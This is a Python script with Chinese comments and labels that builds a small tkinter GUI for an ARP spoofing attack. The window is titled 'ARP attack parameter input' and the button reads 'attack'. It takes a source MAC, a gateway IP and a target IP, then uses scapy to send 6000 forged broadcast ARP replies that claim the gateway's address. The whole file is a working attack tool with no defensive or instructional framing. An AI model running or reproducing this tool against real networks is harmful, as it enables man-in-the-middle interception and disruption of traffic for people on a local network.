import tkinter as tk
import tkinter.messagebox as messagebox
from scapy.all import *
import time
import re
from scapy.layers.l2 import Ether, ARP

def validate_ip(ip):
    """
    检查IP地址的格式是否正确
    Args:
        ip (str): 要验证的IP地址
    Returns:
        bool: 如果IP地址格式正确，则返回True；否则返回False
    """
    ip_regex = re.compile(r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$')
    if ip_regex.match(ip):
        return True
    else:
        messagebox.showerror("错误", "无效的IP地址格式，请重新输入。")
        return False

def validate_mac(mac):
    """
    检查MAC地址的格式是否正确
    Args:
        mac (str): 要验证的MAC地址
    Returns:
        bool: 如果MAC地址格式正确，则返回True；否则返回False
    """
    mac_regex = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
    if mac_regex.match(mac):
        return True
    else:
        messagebox.showerror("错误", "无效的MAC地址格式，请重新输入。")
        return False

def arp(src,pdst,psrc):
    #构造包
    #pdst是目标IP，psrc是网关的ip
    p1=Ether(dst="ff:ff:ff:ff:ff:ff",src=src)/ARP(pdst=pdst,psrc=psrc)
    for i in range(6000):# 循环发送6000次
        sendp(p1)#发送包
        time.sleep(0.2)

def get_input():
    root = tk.Tk()
    root.title("ARP攻击参数输入")

    src_label = tk.Label(root, text="输入源MAC地址：")
    src_label.pack()
    src_entry = tk.Entry(root)
    src_entry.pack()

    psrc_label = tk.Label(root, text="发送方的协议地址（IP地址）:")
    psrc_label.pack()
    psrc_entry = tk.Entry(root)
    psrc_entry.pack()

    pdst_label = tk.Label(root, text="目标协议地址（IP地址）:")
    pdst_label.pack()
    pdst_entry = tk.Entry(root)
    pdst_entry.pack()

    def submit():
        src = src_entry.get()
        psrc = psrc_entry.get()
        pdst = pdst_entry.get()
        root.destroy()
        if validate_ip(psrc) and validate_ip(pdst) and validate_mac(src):
            arp(src, pdst, psrc)

    submit_button = tk.Button(root, text="攻击", command=submit)
    submit_button.pack()

    root.mainloop()

get_input()
